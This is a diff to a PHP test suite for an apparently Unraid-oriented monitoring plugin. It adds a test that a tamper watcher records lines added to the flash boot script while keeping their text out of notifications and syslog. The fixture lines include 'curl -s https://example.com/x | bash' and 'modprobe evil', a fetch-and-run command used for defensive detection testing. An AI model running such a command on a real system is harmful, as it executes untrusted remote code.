@@ -7111,6 +7111,8 @@ function testWatchman(): void
     same('watch: rights as flags, the plugin source moved', ['--privileged', 'raw.githubusercontent.com/someone', 'raw.githubusercontent.com/unraid', ['added' => 1, 'removed' => 0]],
         [watchmanText($by['container_privileged'])['rights'], $by['plugin_source']['p']['source'], $by['plugin_source']['p']['old'], watchmanText($by['flash_go'])]);
     $c = $calls();
+    same('watch: go\'s added line kept in its entry (#5)', ['curl -s https://example.com/x | bash'], $by['flash_go']['p']['text'] ?? null);
+    check('watch: go\'s added line never in a notification', !str_contains(implode("\n", $c), 'example.com/x'));
     same('watch: one notification per important kind (ports only in the book), and one for what may belong together (a new address, then rights, plugins, the flash)', 13, count($c));
     check('watch: the chain\'s notification', str_contains(implode("\n", $c), officeNotifyText('watchman', 'notify.chain', ['n' => 12], officeNotifyLang())));
     $lang = officeNotifyLang();
@@ -8189,6 +8191,59 @@ function testWatchmanFlow(): void
         [isset($f['flow_client']['params']['minutes']), isset($f['flow_client']['params']['usual']), $f['flow_client']['params']['size'] ?? null]);
     @unlink(watchmanLockFile($data, 'book'));
     @unlink(watchmanFlowCountersFile($data));
+    exec('rm -rf ' . escapeshellarg($tmp));
+}
+
+/**
+ * go's added lines (#5): their text in the flash_go entry (the first WATCH_GO_SHOW, each cut at WATCH_GO_WIDTH), of removed
+ * lines only their number; never in the entry's words (notification, team lead, SIEM) or the flash mirror
+ */
+function testWatchmanGoLines(): void
+{
+    $tmp = sys_get_temp_dir() . '/office-tests-golines-' . getmypid();
+    @mkdir("$tmp/extra", 0700, true);
+    @mkdir("$tmp/ssh", 0700, true);
+    $paths = ['go' => "$tmp/go", 'extra' => "$tmp/extra", 'passwd' => "$tmp/passwd", 'shadow' => "$tmp/shadow", 'ssh' => "$tmp/ssh"];
+    file_put_contents($paths['passwd'], "root:x:0:0::/root:/bin/bash\n");
+    file_put_contents($paths['shadow'], "root:*:20000:0:99999:7:::\n");
+    $base = "#!/bin/bash\n# Start the Management Utility\n/usr/local/sbin/emhttp &\n";
+    file_put_contents($paths['go'], $base);
+    $known = watchmanFlash($paths);
+    $now = time();
+    $entry = function (string $go) use ($paths, $known, $now): ?array {
+        file_put_contents($paths['go'], $go);
+        $k = $known;
+        $book = [];
+        watchmanFlashCompare($k, watchmanFlash($paths), $book, $now, $paths['go']);
+        return array_column($book, null, 'kind')['flash_go'] ?? null;
+    };
+    $e = $entry($base . "curl -s https://example.com/x | bash\n\n  modprobe evil  \ncurl -s https://example.com/x | bash\n");
+    same('go: lines added — their text (trimmed, a line twice once), the counts', [2, 0, ['curl -s https://example.com/x | bash', 'modprobe evil']],
+        [$e['p']['added'], $e['p']['removed'], $e['p']['text']]);
+    same('go: in words only the counts (the notification, the team lead, the SIEM)', ['added' => 2, 'removed' => 0], watchmanText($e));
+    check('go: the SIEM line without the text', !str_contains(watchmanSyslogLine($e), 'example.com'));
+    $m = watchmanMirror(['book' => [$e], 'baseline' => [], 'state' => []], 'boot', $now, true);
+    check('go: the flash mirror without the text', !str_contains(json_encode($m), 'example.com'));
+    $e = $entry("#!/bin/bash\n/usr/local/sbin/emhttp &\n");
+    same('go: a line removed — only its number, no text', [0, 1, false], [$e['p']['added'], $e['p']['removed'], isset($e['p']['text'])]);
+    $e = $entry("#!/bin/bash\n# Start the Management Utility\n/usr/local/sbin/emhttp -p 8080 &\n");
+    same('go: one line changed — added and removed', [1, 1, ['/usr/local/sbin/emhttp -p 8080 &']], [$e['p']['added'], $e['p']['removed'], $e['p']['text']]);
+    $many = '';
+    foreach (range(1, 25) as $i) {
+        $many .= "echo line $i\n";
+    }
+    $e = $entry($base . $many);
+    same('go: more than ' . WATCH_GO_SHOW . ' added — the first ' . WATCH_GO_SHOW . ' kept, the count says how many', [25, WATCH_GO_SHOW, 'echo line 1', 'echo line 20'],
+        [$e['p']['added'], count($e['p']['text']), $e['p']['text'][0], $e['p']['text'][WATCH_GO_SHOW - 1]]);
+    $long = 'echo ' . str_repeat('ä', 300);
+    $e = $entry($base . $long . "\n" . "printf 'a\tb'\n");
+    same('go: a long line cut, control characters made plain', [WATCH_GO_WIDTH + 1, mb_substr($long, 0, WATCH_GO_WIDTH) . '…', "printf 'a b'"],
+        [mb_strlen($e['p']['text'][0]), $e['p']['text'][0], $e['p']['text'][1]]);
+    @unlink($paths['go']);
+    $k = $known;
+    $book = [];
+    watchmanFlashCompare($k, watchmanFlash($paths), $book, $now, $paths['go']);
+    same('go: the file gone — no text', [true, false], [$book[0]['p']['gone'] ?? null, isset($book[0]['p']['text'])]);
     exec('rm -rf ' . escapeshellarg($tmp));
 }
 
@@ -22352,7 +22407,7 @@ SH);
 // ===================================================================== run
 
 $parts = ['logic' => ['testCron', 'testRetention', 'testPlanGone', 'testSnapPlansTolerant', 'testSleepingPools', 'testSnapshotNames', 'testEmby', 'testEmbyWatch', 'testEmbyImport', 'testOfficeCron', 'testMenuName', 'testWhereArrayZfs', 'testEstimates', 'testBackupFirstUpload', 'testNotify', 'testNotifyLayout', 'testCaretakerAcks', 'testAckContent',
-                      'testBackupPackages', 'testBackupKopiaItems', 'testBackupNewLocal', 'testBackupNewLocalOffice', 'testBackupPlace', 'testSetupUnfold', 'testSetupAsleepKept', 'testBackupPresets', 'testBackupSkip', 'testBackupVmOrder', 'testBackupArrayStop', 'testBackupKopiaAutostart', 'testBackupKopiaOrder', 'testAgentBackupHooks', 'testBackupRecoverNotes', 'testBackupEpipe', 'testBackupPartnerPhase', 'testBackupPartnerOffice', 'testBackupAsleep', 'testBackupAsleepOffice', 'testIcons', 'testIconSquare', 'testRestore', 'testRestoreJobs', 'testRestoreShares', 'testRestoreFindings', 'testRestoreDatabases', 'testRestoreDrill', 'testRestorePartner', 'testPartnerTicket', 'testWatchmanTicket', 'testPartnerSendBack', 'testWatchmanPartner', 'testWatchmanNet', 'testSnapshotPartner', 'testVmOrphans', 'testCleanupPartner', 'testLogsPartner', 'testAdvisor', 'testAdvisorInstall', 'testAdvisorRecord', 'testAdvisorObjectLock', 'testAdvisorPartnerGuide', 'testLogsTour', 'testMetrics', 'testWatchman', 'testWatchmanGone', 'testWatchmanAtUserScript', 'testWatchmanSched', 'testWatchmanOffice', 'testWatchmanFlow', 'testWatchmanFlowGone', 'testWatchmanFlowSources', 'testWatchmanPosture', 'testWatchmanSnaps', 'testWatchmanHost', 'testWatchmanNight', 'testWatchmanBoot', 'testNightUi', 'testJobGuard', 'testComposeBuilds', 'testUnraidPath', 'testExclusive',
+                      'testBackupPackages', 'testBackupKopiaItems', 'testBackupNewLocal', 'testBackupNewLocalOffice', 'testBackupPlace', 'testSetupUnfold', 'testSetupAsleepKept', 'testBackupPresets', 'testBackupSkip', 'testBackupVmOrder', 'testBackupArrayStop', 'testBackupKopiaAutostart', 'testBackupKopiaOrder', 'testAgentBackupHooks', 'testBackupRecoverNotes', 'testBackupEpipe', 'testBackupPartnerPhase', 'testBackupPartnerOffice', 'testBackupAsleep', 'testBackupAsleepOffice', 'testIcons', 'testIconSquare', 'testRestore', 'testRestoreJobs', 'testRestoreShares', 'testRestoreFindings', 'testRestoreDatabases', 'testRestoreDrill', 'testRestorePartner', 'testPartnerTicket', 'testWatchmanTicket', 'testPartnerSendBack', 'testWatchmanPartner', 'testWatchmanNet', 'testSnapshotPartner', 'testVmOrphans', 'testCleanupPartner', 'testLogsPartner', 'testAdvisor', 'testAdvisorInstall', 'testAdvisorRecord', 'testAdvisorObjectLock', 'testAdvisorPartnerGuide', 'testLogsTour', 'testMetrics', 'testWatchman', 'testWatchmanGoLines', 'testWatchmanGone', 'testWatchmanAtUserScript', 'testWatchmanSched', 'testWatchmanOffice', 'testWatchmanFlow', 'testWatchmanFlowGone', 'testWatchmanFlowSources', 'testWatchmanPosture', 'testWatchmanSnaps', 'testWatchmanHost', 'testWatchmanNight', 'testWatchmanBoot', 'testNightUi', 'testJobGuard', 'testComposeBuilds', 'testUnraidPath', 'testExclusive',
                       'testWhereAfterWatchman', 'testWhereVmStop', 'testWhereTunables', 'testBackupSparse', 'testWhereTakeOver', 'testWhereDesk', 'testWhereBuilding', 'testCleanupTick', 'testStaffMerged', 'testStaffOrder', 'testHireWith', 'testMovedDesk', 'testSupporter', 'testLeftovers', 'testOfficeLanguage', 'testThemeSwitch', 'testSizeSwitch', 'testApiLook', 'testLookPage', 'testUpdateNotice', 'testReportDialog', 'testSearchPlaces', 'testSearchItems', 'testSearchGuides', 'testApiGzip', 'testWatchmanApiDoor', 'testCaretakerApi', 'testPartnerPairing', 'testPartnerWatch', 'testPartnerRelease', 'testPartnerUnits', 'testPartnerTolerant', 'testMigrate', 'testBackupReplan', 'testUnraidTested', 'testCronBack', 'testPlgGuard', 'testPlgInstall', 'testPlgRemove', 'testBackupLetGo', 'testApiGetOffline', 'testSupporterList',
                       'testFlockShfs', 'testBackupOneMinute', 'testStrictSettings', 'testRestoreClientEcho', 'testWatchBookView', 'testWatchBookNoteSome', 'testWatchmanAtPlugin', 'testParityWhy', 'testCleanupVolumes'],
           'hardening' => ['testRequestTypes', 'testSafeWrites', 'testAgentRestarted', 'testHeartbeat', 'testDoorbell', 'testSnapshotRecord', 'testTrashManifest', 'testEmbyPaths', 'testAnchors', 'testUpdateClean', 'testAdvisorSecrets', 'testSupporterKeys', 'testPartnerDoor', 'testReport', 'testRunnerNames', 'testSnapshotIds', 'testAgentHired', 'testSupporterClaim'],
